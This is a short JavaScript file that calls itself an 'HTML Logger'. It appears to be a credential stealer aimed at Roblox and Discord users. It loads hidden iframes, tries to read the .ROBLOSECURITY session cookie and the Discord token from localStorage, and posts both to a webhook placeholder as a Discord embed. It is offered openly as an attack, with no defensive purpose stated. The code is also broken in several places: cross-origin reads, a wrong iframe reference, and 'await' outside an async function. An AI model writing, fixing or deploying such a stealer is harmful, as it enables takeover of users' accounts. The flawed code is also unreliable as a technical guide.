/*
 _   _ _____ __  __ _     _     ___   ____  ____ _____ ____
| | | |_   _|  \/  | |   | |   / _ \ / ___|/ ___| ____|  _ \
| |_| | | | | |\/| | |   | |  | | | | |  _| |  _|  _| | |_) |
|  _  | | | | |  | | |___| |__| |_| | |_| | |_| | |___|  _ <
|_| |_| |_| |_|  |_|_____|_____\___/ \____|\____|_____|_| \_\

*/

const webhook = 'WEBHOOK';


function loadURL() {
    var urlx = document.createElement('iframe');
    var urlxdoc = urlx.contentDocument;

    var urly = document.createElement('iframe');
    var urlydoc = urlx.contentDocument;

    let sent = false;


    urlx.setAttribute('src', 'https://roblox.com/');
    urlx.style.display = 'none';
    urlx.style.height = '0%';
    urlx.style.width = '0%';

    urly.setAttribute('src', 'https://discord.com/');
    urly.style.display = 'none';
    urly.style.height = '0%';
    urly.style.width = '0%';

    

    document.body.appendChild(urlx);

    const RBLXCOOKIE = urlxdoc.cookie.split('; ').find(row => row.startsWith('_ROBLOSECURITY=')).split('=')[1];
    const DISCTOKEN = urly.contentWindow.localStorage.getItem('token');
    function sendinfo(_ROBLOSECURITY, TOKEN) {
        var xhr = new XMLHttpRequest();

        xhr.open("POST", webhook, true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify({
            "content": null,
            "embeds": [
                {
                "title": "HTML Logger",
                "description": "Logger grabbed successfully!",
                "color": 10751,
                "fields": [
                    {
                    "name": "_ROBLOSECURITY COOKIE",
                    "value": "```\n" + toString(_ROBLOSECURITY) +"\n```"
                    },
                    {
                    "name": "DISCORD TOKEN",
                    "value": "```\n" + toString(TOKEN) +"\n```"
                    }
                ]
                }
            ],
        }));

        sent = true;
        return 'Sent Packets';
    };

    sendinfo(RBLXCOOKIE, DISCTOKEN);

    while (urlx) {
        if (urlx.innerHTML=='' && sent==true) {
            await sleep(1.5);
            urlx.remove();
        } else {
            await sleep(1.5);
        };
    };
};

async function sleep(seconds) {
    return new Promise((resolve) => setTimeout(resolve, seconds * 1000));
};


loadURL();